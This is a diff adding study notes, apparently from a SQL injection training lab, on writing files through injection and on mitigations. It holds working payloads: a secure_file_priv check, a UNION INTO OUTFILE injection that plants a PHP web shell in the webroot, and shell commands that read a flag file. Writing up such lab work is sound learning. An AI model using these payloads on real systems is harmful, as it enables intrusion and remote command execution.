@@ -306,9 +306,30 @@ That gives us the source of that file and the password is in the page.
 
 ## Writing Files
 
+This section covers Writing Files with SQL Injection. It covers that a lot of SQL DBs default to not allowing any reading or writing. But we can check Information_schema to check for sure.
+
+To be able to write we need a user wtih file permissions, and then the database needs write permissions. We have already covered how to check the user, to check the database we can use:
+`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
+
+If the variable is NULL we have full priviliges.
+
+Then we can do some testing by writing to the webroot.
+If we want to write a web shell we cand o something like: `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
+
+Then we can execute commands using the 0 parameter, like `?0=id`
+
+The question for this section was:
+ Find the flag by using a webshell.
+
+To answer this question we can create our webshell, then run `?0= ls ..`. This gives us a list of contents in the directory above. And we see the flag.txt file. So to get the contents we can simply do `?0 =cat ../flag.txt` 
+
 # Mitigation
 
 ## Mitigation SQL Injections
+
+This section covers ways to mitigate SQL Injection risks.
+
+First we can make sure that any and all input is sanatized. We can also make sure the input is valid. We can make sure users running queries have the least privilige they need. We can use a WAF to detect malicious input and reject any HTTP requests using them. We can use parameterized queries.
 
 # Closing it Out
 
